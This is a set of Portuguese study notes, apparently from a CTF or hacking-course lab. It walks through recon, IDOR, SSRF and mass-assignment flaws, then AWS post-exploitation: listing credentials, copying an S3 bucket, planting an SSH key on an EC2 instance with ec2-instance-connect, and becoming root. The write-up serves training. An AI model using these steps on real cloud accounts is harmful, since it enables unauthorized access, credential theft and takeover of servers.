# Anotações

## Dia 01 - Recon Scritps

Reconhecimento da aplicação.
É uma parte fundamental para encontramos vulnerabilidades. Quanto mais soubemos sobre a aplicação mas vulnerabilidades podemos encontramos.

O que podemos encontrar nessa etapa:

- Portas, IP, servidores em execução.
- Quais tecnologias existem no site.
- Mapear pasta, diretórios e rotas.

## Dia 02 - Análise e identificação de vulnerabilidades

Identificar → analisar → explorar

Na identificação do diretório **./git/**, foi feito Code Review e depois a exploração.

Vulnerabilidades encontradas:

- **IDOR** (Insecure Direct Object Reference) - Não verifica o usuário autenticado, permite acesso a conteúdo de outro usuário.
- **SSRF** (Server Side Request Forgery) - pode levar ao comprometimento do servidor e da rede do cliente.
- **Mass Assignment** - é possível editar qualquer campo no perfil do usuário.

**Desafio**: Explorar a vulnerabilidade IDOR

![flag desafio 02](/shw/pics/flag02.png)

## Dia 03 - Exploração / Invasão

Exploração a vulnerabilidade de SSRF e acesso a AWS.

**CSRF**: tentativa de falsificação de requisição.
Bloqueado pelo Laravel, que utiliza de duas validações:

- Cookie: **XSRF-TOKEN**
- **_token**, gerado randomicamente a cada novo post.

**Burp** suite: tentativa de falsificação de requisição.
Com o burp conseguimos realizar com sucesso:

- Listamos e alteramos campos do usuario. Alterando o tipo de usuário para usuário admin. Vulnerabilidade foi permitida porque não tinha restrição de campo que impeça a alteração do tipo de usuário.
- Acesso IAM. Como acesso ao IAM, conseguimos pegar o servidor atrelado ao perfil e as credenciais:

```bash
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN
```

**Acesso AWS**
Utilizamos AWS CLI, add as credenciais e realizamos uma chamada direita entre nós e AWS:

```bash
aws sts get-caller-identity #verifica se a chave tá funcionando e quem somos nós na AWS
```

Retornando:

```js
{
  UserId, 
  Account,
  Arn
}
```

Testamos o acesso ao S3

```bash
aws s3 ls
```

Retornando com sucesso.

**Desafio**: Encontrar a flag que tá no bucket em user-data.txt

**Solução**: Pesquisei como eu poderia copiar um arquivo do Bucket para a minha máquina.
Encontrei sobre o [CP](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/cp.html).

Basicamente eu chamaria o cp passando o Bucket com o . --recusive, assim eu copiaria tudo do Bucket para a minha máquina.</br>

Depois fiz um cat no arquivo user-data.txt, encontrando a flag.

![flag desafio 03](/shw/pics/flag03.png)

## Dia 04 - Pós-Exploração na AWS

- Listar sevidores(ec2)

```bash
aws ec2 describe-instances
```

![ec2 IP](/shw/pics/ec2-ip-new.png)

Colocamos a lista em leitor de JSON

![lista json](/shw/pics/ec2-retorno-ip.png)

Ao listar ec2, vimos IP que não conhecemos, fizemos um nmap e depois nmap sem o ping.

- Conectar instância EC2:

```bash
ec2-instace-connect help
```

![ec2 help](/shw/pics/ec2.help.png)

EC2 permite que o administrador de sistema envie uma chave ssh publica deles para um servidor.

Olhamos o que precisamos enviar para ter esse acesso:

```bash
aws ec2-instance-connect send-ssh-public-key help
```

![send-ssh-help](/shw/pics/send-ssh-help.png)

```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id i-1234567890abcdef0 \
--instance-os-user ec2-user \
--availability-zone us-east-2b \
--ssh-public-key file://path/my-rsa-key.pub
```

- Precisamos criar chave ssh (só crie se você não tiver uma)

```bahs
ssh-keygen
```

- Precisamos enviar chave publica para o servidor.

```bash
aws ec2-instance-connect send-ssh-public-key --instance-id i-032802861b7c9c59c --instance-os-user ec2-user --ssh-public-key file:///home/kali/.ssh/id_rsa.pub --availability-zone us-east-1a --region us-east-1
```

- instance-id e availability-zone são daquele IP que não conhecemos.

![dados ip](/shw/pics/dado-ip.png)

- Chave enviada com sucesso

![chave enviada](/shw/pics/ec2-send-key-ok.png)

- Agora vamos conectar com o servidor passando a chave ssh(chave privada)

```bash
ssh -i /home/kali/.ssh/id_rsa ec2-user@44.202.22.33
```

![aws](/shw/pics/acessando-aws.png)

**Desafio**: Virar usuario root da máquina
**Solução**:

- sudo passwd root : para mudar a senha do root
- su - : coloquei a nova senha
- ls -la: listei diretórios
- cat root.txt : encontrei a flag

![flag desafio 04](/shw/pics/flag04.png)
